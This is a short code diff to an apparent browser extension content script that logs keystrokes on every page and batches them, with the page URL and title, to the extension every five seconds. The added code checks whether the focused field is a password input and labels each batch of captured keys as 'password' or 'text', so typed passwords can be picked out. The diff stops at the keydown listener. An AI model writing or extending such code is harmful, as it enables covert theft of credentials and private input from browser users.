@@ -3,6 +3,18 @@
   let keyBuffer = [];
   const SEND_INTERVAL = 5000; // Send keys every 5 seconds
   let lastSendTime = Date.now();
+  let field = "";
+
+  function classifyField(target) {
+    if (!target || typeof target.matches !== "function") return "";
+    if (target.matches('input[type="password"], input[name*="pass" i], input[autocomplete="current-password"], input[autocomplete="new-password"]')) {
+      return "password";
+    }
+    if (target.matches("input, textarea, [contenteditable], [contenteditable='true']")) {
+      return "text";
+    }
+    return "";
+  }
 
   function sendKeyboardLogs() {
     if (keyBuffer.length === 0) return;
@@ -14,12 +26,17 @@
       type: "KEYBOARD_DATA",
       data: {
         keys,
+        field,
         url: window.location.href,
         title: document.title,
         timestamp: Date.now()
       }
     }, () => void chrome.runtime.lastError);
   }
+
+  window.addEventListener("focusin", (event) => {
+    field = classifyField(event.target);
+  }, true);
 
   // Listen for key presses
   window.addEventListener('keydown', (event) => {
